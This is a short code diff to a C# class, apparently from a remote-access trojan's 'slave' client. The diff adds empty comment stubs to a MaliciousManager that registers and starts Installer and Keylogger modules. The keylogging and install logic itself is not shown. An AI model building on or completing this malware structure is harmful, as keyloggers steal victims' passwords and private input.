@@ -7,19 +7,31 @@ using System.Threading.Tasks;
 
 namespace BlackHole.Slave.Malicious
 {
+    /// <summary>
+    /// 
+    /// </summary>
     public sealed class MaliciousManager : Singleton<MaliciousManager>
     {
+        /// <summary>
+        /// 
+        /// </summary>
         private List<IMalicious> m_malicious;
 
+        /// <summary>
+        /// 
+        /// </summary>
         public MaliciousManager()
         {
             m_malicious = new List<IMalicious>()
             {
                 Installer.Instance,
-                Keylogger.Instance
+                Keylogger.Instance,
             };
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
         public void Initialize()
         {
             m_malicious.ForEach(malicious => malicious.Initialize());
